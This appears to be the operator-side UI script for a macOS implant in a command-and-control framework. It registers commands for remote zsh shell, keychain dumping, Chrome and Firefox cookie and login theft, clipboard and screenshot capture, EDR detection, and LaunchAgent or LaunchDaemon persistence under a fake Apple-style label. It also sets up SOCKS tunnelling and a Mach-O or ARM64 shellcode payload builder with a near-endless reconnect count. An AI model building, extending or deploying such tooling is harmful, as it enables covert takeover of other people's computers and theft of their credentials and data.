/// macOS agent — AxScript UI configuration

let exit_action = menu.create_action("Exit", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "exit")) });
menu.add_session_agent(exit_action, ["macos"])

let file_browser_action     = menu.create_action("File Browser",    function(agents_id) { agents_id.forEach(id => ax.open_browser_files(id)) });
let process_browser_action  = menu.create_action("Process Browser", function(agents_id) { agents_id.forEach(id => ax.open_browser_process(id)) });
let terminal_browser_action = menu.create_action("Remote Terminal", function(agents_id) { agents_id.forEach(id => ax.open_remote_terminal(id)) });
menu.add_session_browser(file_browser_action, ["macos"])
menu.add_session_browser(process_browser_action, ["macos"])
menu.add_session_browser(terminal_browser_action, ["macos"])

let tunnel_access_action = menu.create_action("Create Tunnel", function(agents_id) { ax.open_access_tunnel(agents_id[0], true, true, false, false) });
menu.add_session_access(tunnel_access_action, ["macos"]);


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(500, 80);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "run " + text_bin.text() + " " + text_args.text();
        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "download " + file.path + file.name) ) });
let remove_action = menu.create_action("Remove", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "rm " + file.path + file.name) ) });
menu.add_filebrowser(download_action, ["macos"])
menu.add_filebrowser(remove_action, ["macos"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "job kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["macos"])


let cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "job kill " + file.file_id) ) });
menu.add_downloads_running(cancel_action, ["macos"])


var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["macos"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["macos"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps");
}
event.on_processbrowser_list(event_process_action, ["macos"]);


function RegisterCommands(listenerType)
{
    let cmd_cat = ax.create_command("cat", "Read a file (less 10 KB)", "cat /etc/passwd", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy file or directory", "cp src.txt dst.txt", "Task: copy file or directory");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_cd = ax.create_command("cd", "Change current working directory", "cd /Users/target", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_download = ax.create_command("download", "Download a file", "download /tmp/file", "Task: download file");
    cmd_download.addArgString("path", true);

    let cmd_exit = ax.create_command("exit", "Kill agent", "exit", "Task: kill agent");

    let _cmd_job_list = ax.create_command("list", "List of jobs", "job list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "job kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("job", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let cmd_kill = ax.create_command("kill", "Kill a process with a given PID", "kill 7865", "Task: kill process");
    cmd_kill.addArgInt("pid", true);

    let cmd_ls = ax.create_command("ls", "List contents of a directory or details of a file", "ls /Users/", "Task: list files");
    cmd_ls.addArgString("path", "", ".");

    let cmd_mv = ax.create_command("mv", "Move file or directory", "mv src.txt dst.txt", "Task: move file or directory");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "Make a directory", "mkdir /tmp/ex", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let cmd_ps = ax.create_command("ps", "Show process list", "ps", "Task: show process list");

    let cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    let cmd_rm = ax.create_command("rm", "Remove a file or folder", "rm /tmp/file", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let cmd_run = ax.create_command("run", "Execute long command or scripts", "run /tmp/script.sh", "Task: command run");
    cmd_run.addArgString("program", true);
    cmd_run.addArgString("args", false);

    let cmd_screenshot = ax.create_command("screenshot", "Take a single screenshot", "screenshot", "Task: screenshot");

    let cmd_clipboard = ax.create_command("clipboard", "Read clipboard contents", "clipboard", "Task: read clipboard");

    let _cmd_persist_la = ax.create_command("launchagent", "Install LaunchAgent persistence (user-level)", "persist launchagent com.apple.mdworker.local", "Task: install LaunchAgent");
    _cmd_persist_la.addArgString("name", true, "Plist label (e.g. com.apple.mdworker.local)");
    let _cmd_persist_ld = ax.create_command("launchdaemon", "Install LaunchDaemon persistence (requires root)", "persist launchdaemon com.apple.mdworker.local", "Task: install LaunchDaemon");
    _cmd_persist_ld.addArgString("name", true, "Plist label");
    let _cmd_persist_rm = ax.create_command("remove", "Remove persistence", "persist remove launchagent com.apple.mdworker.local", "Task: remove persistence");
    _cmd_persist_rm.addArgString("method", true, "launchagent or launchdaemon");
    _cmd_persist_rm.addArgString("name", true, "Plist label");
    let _cmd_persist_st = ax.create_command("status", "Check persistence status", "persist status", "Task: check persistence");
    let cmd_persist = ax.create_command("persist", "Manage persistence (LaunchAgent/LaunchDaemon)");
    cmd_persist.addSubCommands([_cmd_persist_la, _cmd_persist_ld, _cmd_persist_rm, _cmd_persist_st]);

    let cmd_tcc_check = ax.create_command("tcc_check", "Check TCC permissions (FDA, Screen Recording, etc.)", "tcc_check", "Task: check TCC permissions");

    let cmd_defaults_read = ax.create_command("defaults_read", "Read macOS defaults/preferences", "defaults_read NSGlobalDomain", "Task: read defaults");
    cmd_defaults_read.addArgString("domain", false, "Defaults domain (empty for all)");

    let cmd_edr_check = ax.create_command("edr_check", "Detect installed EDR/security products", "edr_check", "Task: EDR detection");

    let _cmd_keychain_list = ax.create_command("list", "List keychains and entries", "keychain list", "Task: list keychains");
    let _cmd_keychain_dump = ax.create_command("dump", "Dump keychain entries", "keychain dump", "Task: dump keychain");
    let cmd_keychain = ax.create_command("keychain", "Interact with macOS Keychain");
    cmd_keychain.addSubCommands([_cmd_keychain_list, _cmd_keychain_dump]);

    let cmd_browser_dump = ax.create_command("browser_dump", "Collect browser data (Chrome/Firefox)", "browser_dump chrome cookies", "Task: browser data collection");
    cmd_browser_dump.addArgString("browser", true, "chrome or firefox");
    cmd_browser_dump.addArgString("target", false, "cookies, history, or logins (empty to list files)");

    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS5 proxy server and listen on a specified port", "socks start 1080 -a user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-a", "Enable User/Password authentication for SOCKS5");
    _cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let cmd_shell = ax.create_command("shell", "Execute command via /bin/zsh", "shell id", "Task: command execute");
    cmd_shell.addArgString("cmd", true);

    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt /Users/target/file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    let cmd_zip = ax.create_command("zip", "Archive (zip) a file or directory", "zip /Users/test /tmp/qwe.zip", "Task: Zip a file or directory");
    cmd_zip.addArgString("path", true);
    cmd_zip.addArgString("zip_path", true);

    let commands_macos = ax.create_commands_group("macos", [cmd_browser_dump, cmd_cat, cmd_clipboard, cmd_cp, cmd_cd, cmd_defaults_read, cmd_download, cmd_edr_check, cmd_exit, cmd_job, cmd_keychain, cmd_kill, cmd_ls, cmd_mv, cmd_mkdir, cmd_persist, cmd_ps, cmd_pwd, cmd_rm, cmd_run, cmd_screenshot, cmd_socks, cmd_shell, cmd_tcc_check, cmd_upload, cmd_zip]);

    return {
        commands_macos: commands_macos
    }
}

function GenerateUI(listeners_type)
{
    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo()
    comboFormat.addItems(["Binary Mach-O (Native)", "Shellcode ARM64 (Native)"]);

    let labelTarget = form.create_label("Target:");
    let textTarget = form.create_textline("macOS ARM64 (Apple Silicon)");
    textTarget.setEnabled(false);

    let hline = form.create_hline()

    let labelReconnTimeout = form.create_label("Reconnect timeout:");
    let textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds")

    let labelReconnCount = form.create_label("Reconnect count:");
    let spinReconnCount = form.create_spin();
    spinReconnCount.setRange(0, 1000000000);
    spinReconnCount.setValue(1000000000);

    let layout = form.create_gridlayout();
    layout.addWidget(labelTarget, 0, 0, 1, 1);
    layout.addWidget(textTarget, 0, 1, 1, 1);
    layout.addWidget(labelFormat, 1, 0, 1, 1);
    layout.addWidget(comboFormat, 1, 1, 1, 1);
    layout.addWidget(hline, 2, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 3, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 3, 1, 1, 1);
    layout.addWidget(labelReconnCount, 4, 0, 1, 1);
    layout.addWidget(spinReconnCount, 4, 1, 1, 1);

    let container = form.create_container()
    container.put("format", comboFormat)
    container.put("reconn_timeout", textReconnTimeout)
    container.put("reconn_count", spinReconnCount)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 400,
        ui_width: 550
    }
}
